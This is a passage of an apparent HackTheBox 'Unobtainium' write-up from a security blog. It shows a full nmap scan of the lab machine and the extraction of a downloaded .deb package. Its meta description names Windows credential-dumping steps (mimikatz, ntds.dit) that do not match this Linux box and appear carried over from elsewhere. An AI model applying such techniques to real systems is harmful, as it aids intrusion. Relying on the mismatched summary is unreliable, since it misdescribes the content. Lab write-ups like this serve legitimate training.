<!DOCTYPE html>
<html lang="en">
    <head>
        <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
        <script>
          window.OneSignal = window.OneSignal || [];
          OneSignal.push(function() {
            OneSignal.init({
              appId: "f80eb8e0-fe33-466b-9e51-55cf70a369c0",
            });
          });
        </script>
</script><script type="text/javascript" src="/lightgallery/lightbox.js"></script>
<link rel="stylesheet" href="/lightgallery/lightbox.css">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link rel="preload" as="style" href="/assets/css/post.css">
<link rel="preload" as="style" href="/assets/css/syntax.css">
<link rel="stylesheet" href="/assets/css/post.css">
<link rel="stylesheet" href="/assets/css/syntax.css">
<link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
<link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
<link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"/>
<script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
<script src="/assets/js/dist/toc.min.js" async></script>
<meta name="description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:title" content="Hackthebox Unobtainium writeup"/>
<meta property="og:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:image" content="/hackthebox/unobtainium/unobtainium.png"/>
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@0xdedinfosec">
<meta property="twitter:title" content="Hackthebox Unobtainium writeup">
<meta name="twitter:creator" content="@0xdedinfosec">
<meta name="twitter:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file.">
<meta name="twitter:image" content="https://0xdedinfosec.github.io/hackthebox/unobtainium/unobtainium.png">
<title>Hackthebox Unobtainium writeup | 0xDedinfosec</title>
<meta name="generator" content="Jekyll v4.1.0"/>
<meta property="og:title" content="Hackthebox Unobtainium writeup"/>
<meta name="author" content="Dedinfosec"/>
<meta property="og:locale" content="en_US"/>
<meta name="description" content="Introduction@Unobtainium:~$"/>
<meta property="og:description" content="Introduction@Unobtainium:~$"/>
<link rel="canonical" href="http://0xdedinfosec.github.io/posts/htb-unobtainium/"/>
<meta property="og:url" content="http://0xdedinfosec.github.io/posts/htb-unobtainium/"/>
<meta property="og:site_name" content="0xDedinfosec"/>
<meta property="og:type" content="article"/>
<meta property="article:published_time" content="2021-04-18T00:00:00+00:00"/>
<meta name="twitter:card" content="summary"/>
<meta property="twitter:title" content="Hackthebox Unobtainium writeup"/>
<meta name="twitter:site" content="@0xdedinfosec"/>
<meta name="twitter:creator" content="@Dedinfosec"/>
<meta name="google-site-verification" content="wGINLdo0D8EDbBKQUhYUaGeXyt9--AoGMiMjtEzayc4" />
<script type="application/ld+json">
     {"@type":"BlogPosting","headline":"Hackthebox Unobtainium writeup","dateModified":"2021-04-18T00:00:00+00:00","datePublished":"2021-04-18T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0xdedinfosec.github.io/posts/htb-unobtainium/"},"author":{"@type":"Person","name":"Dedinfosec"},"url":"http://0xdedinfosec.github.io/posts/htb-unobtainium/","description":"Introduction@Unobtainium:~$","@context":"https://schema.org"}
</script>
<!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license -->
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
<link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png">
<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png">
<link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/manifest.json">
<meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'>
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
<link rel="dns-prefetch" href="https://fonts.gstatic.com">
<link rel="preconnect" href="cdn.jsdelivr.net">
<link rel="dns-prefetch" href="cdn.jsdelivr.net">
<link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin>
<link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
<link rel="preload" as="style" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
<link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
<script>
    window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>');
</script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous" async></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script>
<script src="/assets/js/dist/commons.js" async></script>
<script src="/assets/js/dist/timeago.min.js" async></script>
<link rel="preload" as="style" href="/assets/css/post.css">
<link rel="preload" as="style" href="/assets/css/syntax.css">
<link rel="stylesheet" href="/assets/css/post.css">
<link rel="stylesheet" href="/assets/css/syntax.css">
<link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
<link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
<link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"/>
<script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
<script src="/assets/js/dist/toc.min.js" async></script>
<meta name="description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:title" content="Hackthebox Unobtainium writeup"/>
<meta property="og:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:image" content="/hackthebox/unobtainium/unobtainium.png"/>
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@0xdedinfosec">
<meta property="twitter:title" content="Hackthebox Unobtainium writeup">
<meta name="twitter:creator" content="@0xdedinfosec">
<meta name="twitter:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file.">
<meta name="twitter:image" content="https://0xdedinfosec.github.io/hackthebox/unobtainium/unobtainium.png">
<script src="/assets/js/dist/tooltip-loader.min.js" async></script>
<script src="/assets/js/prism.js"></script>
<link rel="stylesheet" href="/assets/css/prism.css">
</head>
<body data-spy="scroll" data-target="#toc">
    <div id="sidebar" class="d-flex flex-column">
        <div id="nav-wrapper">
            <div id="profile-wrapper" class="d-flex flex-column">
                <div id="avatar" class="d-flex justify-content-center">
                    <a href="/" alt="avatar">
                        <img src="/assets/img/sample/avater1.png" alt="avatar">
                    </a>
                </div>
                <div class="profile-text mt-3">
                    <div id="site-title">
                        <a href="/">0xDedinfosec</a>
                    </div>
                    <div id="site-subtitle" class="font-italic">InfoSec/Cybersec Blog And Writeups</div>
                </div>
            </div>
            <ul class="nav flex-column">
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i>
                        <span>HOME</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/donation/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fab fa-donate ml-3 mr-3 unloaded"></i>
                        <span>DONATION-OSCP</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i>
                        <span>CATEGORIES</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i>
                        <span>TAGS</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i>
                        <span>TIMELINE</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i>
                        <span>WHOAMI</span>
                    </a>
                </li>
            </ul>
        </div>
        <div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4">
            <span id="mode-toggle-wrapper">
                <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License -->
                <i class="mode-toggle fas fa-sun" light-mode-invisible></i>
                <i class="mode-toggle fas fa-moon" dark-mode-invisible></i>
                <script type="text/javascript">
                    class ModeToggle {
                        static get MODE_KEY() {
                            return "mode";
                        }
                        static get DARK_MODE() {
                            return "dark";
                        }
                        static get LIGHT_MODE() {
                            return "light";
                        }
                        constructor() {
                            if (this.mode != null) {
                                if (this.mode == ModeToggle.DARK_MODE) {
                                    if (!this.isDarkPrefer) {
                                        this.setDark();
                                    }
                                } else {
                                    if (this.isDarkPrefer) {
                                        this.setLight();
                                    }
                                }
                            }
                            var self = this;
                            /* always follow the system prefers */
                            this.sysDarkPrefers.addListener(function() {
                                if (self.mode != null) {
                                    if (self.mode == ModeToggle.DARK_MODE) {
                                        if (!self.isDarkPrefer) {
                                            self.setDark();
                                        }
                                    } else {
                                        if (self.isDarkPrefer) {
                                            self.setLight();
                                        }
                                    }
                                    self.clearMode();
                                }
                            });
                        }
                        /* constructor() */
                        setDark() {
                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
                        }
                        setLight() {
                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
                        }
                        clearMode() {
                            $('html').removeAttr(ModeToggle.MODE_KEY);
                            sessionStorage.removeItem(ModeToggle.MODE_KEY);
                        }
                        get sysDarkPrefers() {
                            return window.matchMedia("(prefers-color-scheme: dark)");
                        }
                        get isDarkPrefer() {
                            return true;
                        }
                        get mode() {
                            return sessionStorage.getItem(ModeToggle.MODE_KEY);
                        }
                        flipMode() {
                            if ((this.mode == null && this.isDarkPrefer) || this.mode == ModeToggle.DARK_MODE) {
                                this.setLight();
                            } else {
                                /* light mode or default-light */
                                this.setDark();
                            }
                        }
                    }
                    /* ModeToggle */
                    let toggle = new ModeToggle();
                    $(".mode-toggle").click(function() {
                        toggle.flipMode();
                    });
                </script>
            </span>
            <span class="icon-border"></span>
            <a href="https://www.hackthebox.eu/home/users/profile/262485" target="_blank">
            </i><i class="fas fa-cube"></i>
            </a>
            <a href="https://github.com/0xdedinfosec" target="_blank">
                <i class="fab fa-github"></i>
            </a>
            <a href="#">
                <i class="fab fa-discord"></i>
            </a>
            <a href="#">
                <i class="fab fa-twitter"></i>
            </a>
            <a href="https://www.facebook.com/dedsecinfoServices/" target="_blank"> <i class="fab fa-facebook"></i> </a>
            </div></div>
<div id="main-wrapper">
    <div id="topbar-wrapper" class="row justify-content-center topbar-down">
        <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
            <span id="breadcrumb">
                <span>
                    <a href="/">Posts </a>
                </span>
                <span>Hackthebox Unobtainium writeup</span>
            </span>
            <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>
            <div id="topbar-title">Post</div>
            <i id="search-trigger" class="fas fa-search fa-fw"></i>
            <span id="search-wrapper" class="align-items-center">
                <i class="fas fa-search fa-fw"></i>
                <input class="form-control" id="search-input" type="search" placeholder="Search...">
                <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
            </span>
            <span id="search-cancel">Cancel</span>
        </div>
    </div>
    <div id="main">
        <div class="row">
            <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">
                <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
                    <h1 data-toc-skip>Hackthebox Unobtainium writeup</h1>
                    <div class="post-meta text-muted d-flex flex-column">
                        <div>
                            <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 18, 2021, 12:00 AM +0000">
                                Apr 18, 2021 <i class="unloaded">2021-04-18T00:00:00+00:00</i>
                            </span>
                            on <a href='/categories/hackthebox/'>Hackthebox</a>
                            , <a href='/categories/active/'>active</a>
                        </div>
                    </div>
                    <div class="post-content">
                        <img src="/hackthebox/unobtainium/unobtainium.png">
                        <h1>Introduction@Unobtainium:~$</h1>
                            <table>
                                <thead>
                                    <tr>
                                        <th>Column
                                        <th>
                                            Details
                                <tbody>
                                    <tr>
                                        <td>Name
                                        <td>
                                            Unobtainium
                                    <tr>
                                        <td>IP
                                        <td>
                                            10.10.10.235
                                    <tr>
                                        <td>Points
                                        <td>
                                            40
                                    <tr>
                                        <td>Os
                                        <td>
                                            Linux
                                    <tr>
                                        <td>Difficulty
                                        <td>
                                            Hard
                                    <tr>
                                        <td>Creator
                                        <td>
                                            <a href="https://www.hackthebox.eu/home/users/profile/27390"
                                                target="_blank">felamos </a>
                                    <tr>
                                        <td>Out On
                                        <td>10 Apr 2021
                            </table>
                            <h1 id="pwned">Pwned</h1>
                            <html>

                            <head>
                                <link rel="stylesheet" type="text/css" href="/asciinema-player.css" />

                            <body>
                                <asciinema-player src="Unobtainium.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1"
                                    cols="150" rows="20"></asciinema-player>
                                <script src="/asciinema-player.js"></script>
                                <h1 id="recon">Recon</h1>
                                <h2 id="nmap">Nmap</h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">┌───[us-free-1]─[10.10.14.81]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
└──╼ [★]$ nmap -sC -sV -p- -oA nmap/result 10.10.10.235
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-28 08:57 CDT
Nmap scan report for 10.10.10.235
Host is up (0.22s latency).
PORT      STATE SERVICE          REASON         VERSION
22/tcp    open  ssh              syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)
|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)
|_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)
80/tcp    open  http             syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium
2379/tcp  open  ssl/etcd-client? syn-ack ttl 63
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Issuer: commonName=etcd-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-17T07:10:30
| Not valid after:  2022-01-17T07:10:30
| MD5:   bf49 c77d 7900 011e 603c 26f5 9620 af5d
|_SHA-1: 3ad8 d245 3655 0459 3cae 0454 0992 b85d c7ca 7531
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  h2
| tls-nextprotoneg:
|_  h2
2380/tcp  open  ssl/etcd-server? syn-ack ttl 63
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Issuer: commonName=etcd-ca
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-17T07:10:30
| Not valid after:  2022-01-17T07:10:30
| MD5:   f920 4337 4559 aad2 fd5c 41bf 0b9c 827c
|_SHA-1: 729f 3481 33c5 eaba 5922 1b34 8bb8 e052 a107 a521
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  h2
| tls-nextprotoneg:
|_  h2
8443/tcp  open  ssl/https-alt    syn-ack ttl 63
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Mon, 12 Apr 2021 02:52:45 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Mon, 12 Apr 2021 02:52:44 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions:
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Mon, 12 Apr 2021 02:52:44 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Issuer: commonName=minikubeCA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-11T02:30:32
| Not valid after:  2022-04-12T02:30:32
| MD5:   3f48 15e8 7ed6 560f e45f d2f3 5b2d e71a
|_SHA-1: f127 e2d1 e333 541d 2016 9025 2c1b c9b3 7a87 c2e7
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|_  http/1.1
10249/tcp open  http             syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium@1610865428
| Subject Alternative Name: DNS:unobtainium
| Issuer: commonName=unobtainium-ca@1610865428
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-17T05:37:08
| Not valid after:  2022-01-17T05:37:08
| MD5:   fa5f 3f5c 5f93 30d2 5105 2aad 71a4 96f6
|_SHA-1: d67f 5a73 83b7 2393 1612 e88a 12c5 6bf1 9552 36b3
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|_  http/1.1
10256/tcp open  http             syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
31337/tcp open  http             syn-ack ttl 62 Node.js Express framework
| http-methods:
|   Supported Methods: GET HEAD PUT DELETE POST OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8).</code></pre>
                                <p>
                                    There is a lot's of <code class="highlighter-rouge">ports</code> open
                                </p>
                                <p>
                                    Let's start with <code class="highlighter-rouge">port-80</code>
                                </p>
                                <h2 id="port-80">Port-80</h2>
                                <p>
                                    There is a simple <code class="highlighter-rouge">html page</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/web.png
                                        alt="Port-80" />
                                </p>
                                <p>
                                    Let's download the <code class="highlighter-rouge">.deb</code> package because i am using <code class="highlighter-rouge">parrot-os</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    Unzip the file we got <code class="highlighter-rouge">.deb package</code>.
                                </p>
                                <p>
                                    Let's <code class="highlighter-rouge">extract</code> the files inside <code class="highlighter-rouge">.deb package</code> without installing them.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium/web]
└──╼ [★]$ ls
unobtainium_1.0.0_amd64.deb  unobtainium_1.0.0_amd64.deb.md5sum  unobtainium_debian.zip
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium/web]
└──╼ [★]$ mkdir stuff
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium/web]
└──╼ [★]$ dpkg-deb -xv unobtainium_1.0.0_amd64.deb stuff
./
./usr/
./usr/share/
./usr/share/icons/
./usr/share/icons/hicolor/
./usr/share/icons/hicolor/32x32/
./usr/share/icons/hicolor/32x32/apps/
./usr/share/icons/hicolor/32x32/apps/unobtainium.png
./usr/share/icons/hicolor/48x48/
./usr/share/icons/hicolor/48x48/apps/
./usr/share/icons/hicolor/48x48/apps/unobtainium.png
./usr/share/icons/hicolor/256x256/
./usr/share/icons/hicolor/256x256/apps/
./usr/share/icons/hicolor/256x256/apps/unobtainium.png
./usr/share/icons/hicolor/128x128/
./usr/share/icons/hicolor/128x128/apps/
./usr/share/icons/hicolor/128x128/apps/unobtainium.png
./usr/share/icons/hicolor/64x64/
./usr/share/icons/hicolor/64x64/apps/
./usr/share/icons/hicolor/64x64/apps/unobtainium.png
./usr/share/icons/hicolor/16x16/
./usr/share/icons/hicolor/16x16/apps/
./usr/share/icons/hicolor/16x16/apps/unobtainium.png
./usr/share/applications/
./usr/share/applications/unobtainium.desktop
./usr/share/doc/
./usr/share/doc/unobtainium/
./usr/share/doc/unobtainium/changelog.gz
./opt/
./opt/unobtainium/
./opt/unobtainium/libvulkan.so
./opt/unobtainium/chrome_100_percent.pak
./opt/unobtainium/unobtainium
./opt/unobtainium/libffmpeg.so
./opt/unobtainium/snapshot_blob.bin
./opt/unobtainium/v8_context_snapshot.bin
./opt/unobtainium/vk_swiftshader_icd.json
./opt/unobtainium/LICENSE.electron.txt
./opt/unobtainium/locales/
./opt/unobtainium/locales/th.pak
./opt/unobtainium/locales/da.pak
./opt/unobtainium/locales/gu.pak
./opt/unobtainium/locales/ro.pak
./opt/unobtainium/locales/it.pak
./opt/unobtainium/locales/fil.pak
./opt/unobtainium/locales/fi.pak
./opt/unobtainium/locales/ml.pak
./opt/unobtainium/locales/hu.pak
./opt/unobtainium/locales/id.pak
./opt/unobtainium/locales/zh-CN.pak
./opt/unobtainium/locales/bg.pak
./opt/unobtainium/locales/hi.pak
./opt/unobtainium/locales/sk.pak
./opt/unobtainium/locales/fr.pak
./opt/unobtainium/locales/mr.pak
./opt/unobtainium/locales/et.pak
./opt/unobtainium/locales/kn.pak
./opt/unobtainium/locales/ar.pak
./opt/unobtainium/locales/he.pak
./opt/unobtainium/locales/sv.pak
./opt/unobtainium/locales/en-GB.pak
./opt/unobtainium/locales/cs.pak
./opt/unobtainium/locales/te.pak
./opt/unobtainium/locales/el.pak
./opt/unobtainium/locales/pt-PT.pak
./opt/unobtainium/locales/hr.pak
./opt/unobtainium/locales/ru.pak
./opt/unobtainium/locales/ca.pak
./opt/unobtainium/locales/es.pak
./opt/unobtainium/locales/sw.pak
./opt/unobtainium/locales/uk.pak
./opt/unobtainium/locales/fa.pak
./opt/unobtainium/locales/ko.pak
./opt/unobtainium/locales/es-419.pak
./opt/unobtainium/locales/vi.pak
./opt/unobtainium/locales/lv.pak
./opt/unobtainium/locales/zh-TW.pak
./opt/unobtainium/locales/pl.pak
./opt/unobtainium/locales/pt-BR.pak
./opt/unobtainium/locales/sl.pak
./opt/unobtainium/locales/nl.pak
./opt/unobtainium/locales/ja.pak
./opt/unobtainium/locales/sr.pak
./opt/unobtainium/locales/am.pak
./opt/unobtainium/locales/bn.pak
./opt/unobtainium/locales/ms.pak
./opt/unobtainium/locales/nb.pak
./opt/unobtainium/locales/tr.pak
./opt/unobtainium/locales/de.pak
./opt/unobtainium/locales/ta.pak
./opt/unobtainium/locales/en-US.pak
./opt/unobtainium/locales/lt.pak
./opt/unobtainium/chrome-sandbox
./opt/unobtainium/libEGL.so
./opt/unobtainium/resources/
./opt/unobtainium/resources/app.asar
./opt/unobtainium/chrome_200_percent.pak
./opt/unobtainium/libGLESv2.so
./opt/unobtainium/swiftshader/
./opt/unobtainium/swiftshader/libEGL.so
./opt/unobtainium/swiftshader/libGLESv2.so
./opt/unobtainium/resources.pak
./opt/unobtainium/icudtl.dat
./opt/unobtainium/LICENSES.chromium.html
./opt/unobtainium/libvk_swiftshader.so
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium/web]
└──╼ [★]$
